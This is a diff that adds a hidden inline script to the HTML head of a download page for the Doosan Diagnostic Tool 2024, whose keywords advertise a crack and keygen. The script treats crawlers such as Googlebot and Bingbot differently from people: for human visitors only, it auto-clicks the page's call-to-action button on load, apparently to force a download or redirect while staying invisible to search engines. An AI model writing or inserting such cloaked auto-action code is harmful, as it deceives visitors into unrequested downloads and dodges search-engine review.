@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Doosan Diagnostic Tool (DDT) 2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Doosan Diagnostic Tool (DDT) 2024 for detailed diagnostics of engine, transmission, hydraulic and electrical systems, in English and Korean.">
     <meta name="keywords" content="Doosan Diagnostic Tool, DDT 2024, Doosan Diagnostic Tool 2024, Doosan Diagnostic Tool free download, DDT 2024 free download, DDT diagnostic software, DDT diagnostic software download, DDT diagnostic software download free, DDT diagnostic software crack, DDT diagnostic software keygen, Doosan DDT diagnostic software, Doosan DDT diagnostic tool, Doosan diagnostics, DDT G2 Scan DCU 2023, DDT G2 Scan ECU 2023, DDT G2 Scan LPG 2022, DDT EURO6 Diesel 2022, DDT T3 EDC7 2021, DDT T3 EDC17 2021, DDT TIER4 SCR 2023, DDT TIER4 DPF 2023, DDT DX22 Scan Engine 2023, DDT Marine Engine 2023, DDT OH60 Scan DCU 2022, DDT OH60 Scan ECU 2022, DDT LPG 2023, DDT Stage 5 2022, DL06 F4F Engine SCR, DL06 F4F DPF, DDT OH60ScrScan 2022, G2 Stage V DM DN Engine 2024, DL06 DL08 Stage V 2024, DDT E_Powerpack 2023, DX22 Electronic Marine DCU 2024, Doosan diagnostic software English, Doosan diagnostic software Korean, Doosan diagnostic software Windows 10, Doosan diagnostic software Windows 11, Doosan engine diagnostics, Doosan transmission diagnostics, Doosan hydraulic system diagnostics, Doosan electrical system diagnostics, real-time monitoring Doosan, system parameter analysis Doosan">
     <style>
